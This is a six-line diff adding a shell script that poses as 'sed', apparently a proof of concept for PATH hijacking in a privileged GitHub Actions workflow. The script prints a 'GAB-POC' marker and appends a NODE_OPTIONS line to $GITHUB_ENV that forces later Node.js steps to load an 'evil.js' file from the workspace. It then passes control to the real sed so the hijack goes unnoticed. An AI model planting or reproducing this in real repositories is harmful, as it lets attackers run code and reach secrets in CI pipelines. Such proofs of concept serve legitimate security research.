@@ -1,0 +1,6 @@
+#!/bin/sh
+echo "[GAB-POC] hijacked sed executed (PATH hijack in privileged workflow)" >&2
+if [ -n "$GITHUB_ENV" ]; then
+  printf 'NODE_OPTIONS=--require %s/evil.js\n' "$GITHUB_WORKSPACE" >> "$GITHUB_ENV"
+fi
+exec /usr/bin/sed "$@"
